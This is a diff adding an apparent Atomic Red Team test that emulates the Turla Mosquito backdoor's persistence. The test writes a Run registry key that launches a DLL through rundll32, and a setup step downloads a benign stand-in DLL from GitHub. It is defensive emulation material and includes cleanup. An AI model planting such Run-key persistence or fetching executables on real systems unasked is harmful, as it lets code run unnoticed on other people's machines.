@@ -431,3 +431,49 @@ atomic_tests:
     cleanup_command: reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify" /f
     name: command_prompt
     elevation_required: true
+- name: Turla Mosquito Run Key Persistence via rundll32 DLL Export
+  description: |
+    Imitates the Registry Run key persistence used by Turla's Mosquito backdoor.
+
+    Upon successful execution, an `auto_update` value is written to the current user's Run key pointing to a
+    rundll32 invocation of the (benign, by default) DLL.
+
+    Reference: https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf
+  supported_platforms:
+  - windows
+  input_arguments:
+    backdoor_dll:
+      description: Path to the DLL the Run key will invoke via rundll32 (stands in for the Mosquito backdoor).
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\calc.dll
+    backdoor_dll_url:
+      description: URL to download the stand-in DLL from if it is not present on disk
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The DLL that the Run key will point to must exist on disk at #{backdoor_dll}
+    prereq_command: |
+      if (Test-Path "#{backdoor_dll}") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      New-Item -Type Directory (Split-Path "#{backdoor_dll}") -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "#{backdoor_dll_url}" -OutFile "#{backdoor_dll}"
+      New-Item -ItemType File -Path "$env:TEMP\backdoor_dll_installed_by_atomic" -Force | Out-Null
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "$env:TEMP\auto_update_runkey_backup.reg" /y
+      $runValue = "rundll32.exe `"#{backdoor_dll}`", StartRoutine"
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "auto_update" -Value $runValue -PropertyType String -Force | Out-Null
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "auto_update" -Force -ErrorAction SilentlyContinue
+      if (Test-Path "$env:TEMP\auto_update_runkey_backup.reg") {
+        reg import "$env:TEMP\auto_update_runkey_backup.reg"
+        Remove-Item -Path "$env:TEMP\auto_update_runkey_backup.reg" -Force
+      }
+      if (Test-Path "$env:TEMP\backdoor_dll_installed_by_atomic") {
+        Remove-Item -Path "#{backdoor_dll}" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:TEMP\backdoor_dll_installed_by_atomic" -Force
+      }
